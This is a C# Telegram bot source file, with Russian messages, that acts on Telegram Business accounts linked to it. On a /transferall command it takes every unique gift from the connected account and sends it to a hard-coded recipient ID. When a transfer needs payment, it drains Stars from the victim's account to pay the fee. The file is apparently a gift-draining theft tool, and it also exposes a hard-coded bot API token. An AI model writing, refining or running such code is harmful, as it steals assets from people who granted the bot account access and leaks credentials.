using System;
using System.Net.Http;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

class Program
{
	static string? _lastBusinessConnectionId;
	static long? _lastBusinessUserId;
	static int costTransfer = 25;
	const long recipientUserId = 1058372826;

	static async Task Main()
	{
		var bot = new TelegramBotClient("7500702903:AAHmFbVTkkG31iCUfF6cuTZvW6v3l0x-I7c");

		using var cts = new CancellationTokenSource();

		bot.StartReceiving(
			HandleUpdateAsync,
			HandleErrorAsync,
			new ReceiverOptions
			{
				AllowedUpdates = new[] { UpdateType.Message, UpdateType.BusinessConnection }
			},
			cts.Token
		);

		Console.WriteLine("Бот запущен. Ожидаем бизнес-соединения...");
		Console.ReadLine();
		cts.Cancel();
	}

	static async Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken ct)
	{
		if (update.Type == UpdateType.BusinessConnection && update.BusinessConnection != null)
		{
			_lastBusinessConnectionId = update.BusinessConnection.Id;
			_lastBusinessUserId = update.BusinessConnection.User.Id;

			await SafeSend(bot, _lastBusinessUserId.Value, $"Вход выполнен как {update.BusinessConnection.User.FirstName}", ct);
			return;
		}

		if (update.Type == UpdateType.Message && update.Message?.Text != null)
		{
			var message = update.Message;
			var chatId = message.Chat.Id;
			var text = message.Text.Trim();

			if (text == "/transferall")
			{
				if (string.IsNullOrEmpty(_lastBusinessConnectionId) || _lastBusinessUserId == null)
				{
					await SafeSend(bot, chatId, "Нет бизнес-соединения.", ct);
					return;
				}


				var gifts = await bot.GetBusinessAccountGifts(_lastBusinessConnectionId);
				int successCount = 0;
				int failCount = 0;
				foreach (var g in gifts.Gifts)
				{
					if (g is not OwnedGiftUnique uniqueGift)
						continue;

					string giftId = uniqueGift.OwnedGiftId;
					string description = $"Подарок: {giftId} {g.Type}";


					bool success = await TransferGift(bot, _lastBusinessConnectionId, giftId, recipientUserId);
					string result = success
						? $"Подарок {giftId} передан пользователю {recipientUserId}"
						: $"Ошибка при передаче подарка {giftId}";


					if (success) successCount++; else failCount++;
				}

			}
		}
	}

	static async Task<bool> TransferGift(ITelegramBotClient bot, string businessConnectionId, string giftId, long recipientUserId)
	{
		try
		{
			await bot.TransferGift(businessConnectionId, giftId, recipientUserId, costTransfer);
			return true;
		}
		catch (ApiRequestException ex) when (ex.Message.Contains("PAYMENT_REQUIRED"))
		{
			Console.WriteLine("⚠ Недостаточно средств. Попробуем пополнить...");

			var balance = await bot.GetMyStarBalance();
			if (balance.Amount < 24)
			{
				try
				{
					await bot.TransferBusinessAccountStars(businessConnectionId, 25);
					Console.WriteLine("✅ Пополнение успешно. Повторяем передачу...");

					await bot.TransferGift(businessConnectionId, giftId, recipientUserId, costTransfer);
					return true;
				}
				catch (Exception ex2)
				{
					Console.WriteLine($"❌ Ошибка при повторной попытке: {ex2.Message}");
					return false;
				}
			}
			else
			{
				Console.WriteLine("✅ Баланс достаточный, пробуем снова...");
				await bot.TransferGift(businessConnectionId, giftId, recipientUserId, costTransfer);
				return true;
			}
		}
		catch (ApiRequestException ex)
		{
			Console.WriteLine($"Ошибка Telegram API: {ex.Message}");
			return false;
		}
		catch (Exception ex)
		{
			Console.WriteLine($"Неизвестная ошибка: {ex.Message}");
			return false;
		}
	}

	static async Task SafeSend(ITelegramBotClient bot, long chatId, string? text, CancellationToken ct)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(text))
			{
				Console.WriteLine($"Пустое сообщение! chatId: {chatId}");
				return;
			}

			await bot.SendMessage(chatId, text, cancellationToken: ct);
		}
		catch (Exception ex)
		{
			Console.WriteLine($"Ошибка при отправке сообщения: {ex.Message}\n📩 Сообщение: {text}");
		}
	}

	static Task HandleErrorAsync(ITelegramBotClient bot, Exception ex, CancellationToken ct)
	{
		Console.WriteLine($"Ошибка: {ex.Message}");
		return Task.CompletedTask;
	}
}
